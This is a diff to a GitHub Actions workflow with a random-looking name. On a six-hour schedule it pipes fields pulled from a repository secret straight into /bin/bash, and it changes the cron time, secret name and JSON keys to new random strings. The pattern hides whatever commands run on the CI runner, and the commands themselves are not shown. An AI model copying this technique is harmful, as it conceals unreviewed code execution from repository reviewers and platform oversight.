@@ -2,24 +2,25 @@ name: weishenhou9876
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 5/6 * * *'
+    - cron: '15 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: weishenhou9876
         env:
-          y8967: ${{ secrets.y8967 }}
+          uvuzy61042: ${{ secrets.uvuzy61042 }}
         run: |
-          echo $y8967 | jq -r .mnhi72 | /bin/bash
-          echo $jlpv2353 | jq -r .wtims8435 | /bin/bash
-          echo $j2 | jq -r .bjud98 | /bin/bash
-          echo $hrab32 | jq -r .opmey4 | /bin/bash
-          echo $yttf76 | jq -r .vq0411 | /bin/bash
-          echo $s8 | jq -r .jzbg62661 | /bin/bash
-          echo $xg5678 | jq -r .rb78103 | /bin/bash
-          echo $nett84 | jq -r .pvf1032 | /bin/bash
+          echo $uvuzy61042 | jq -r .kqzaw3050 | /bin/bash
+          echo $q53697 | jq -r .jm99968 | /bin/bash
+          echo $dhg7 | jq -r .rqfx2835 | /bin/bash
+          echo $iho09880 | jq -r .mwd84929 | /bin/bash
+          echo $u8056 | jq -r .zx2051 | /bin/bash
+          echo $udzwk9688 | jq -r .qf8 | /bin/bash
+          echo $v4 | jq -r .q48415 | /bin/bash
+          echo $i5 | jq -r .dnrdf479 | /bin/bash
+          echo $vhgtf42 | jq -r .hmte5 | /bin/bash
+          echo $mpgb23 | jq -r .lni86033 | /bin/bash
 
